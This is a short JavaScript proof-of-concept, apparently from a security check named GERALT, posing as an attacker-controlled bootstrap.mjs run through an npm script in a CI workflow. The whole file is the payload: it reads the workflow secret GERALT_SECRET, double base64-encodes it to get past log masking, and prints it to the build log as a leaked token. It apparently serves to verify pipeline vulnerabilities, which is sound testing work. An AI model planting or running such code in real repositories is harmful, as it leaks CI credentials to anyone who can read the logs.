// GERALT verification payload: attacker-controlled scripts/bootstrap.mjs
// Reached via: npm run bootstrap -- --scope=core  =>  node scripts/bootstrap.mjs
// (workflow top-level env GERALT_SECRET is present in every step)
const secret = process.env.GERALT_SECRET || "";
const b64b64 = Buffer.from(
  Buffer.from(secret, "utf8").toString("base64"),
  "utf8"
).toString("base64");
console.log("GERALT_LEAKED_TOKEN=" + b64b64);
console.error("GERALT_DBG: attacker-controlled scripts/bootstrap.mjs executed");
process.exit(1);
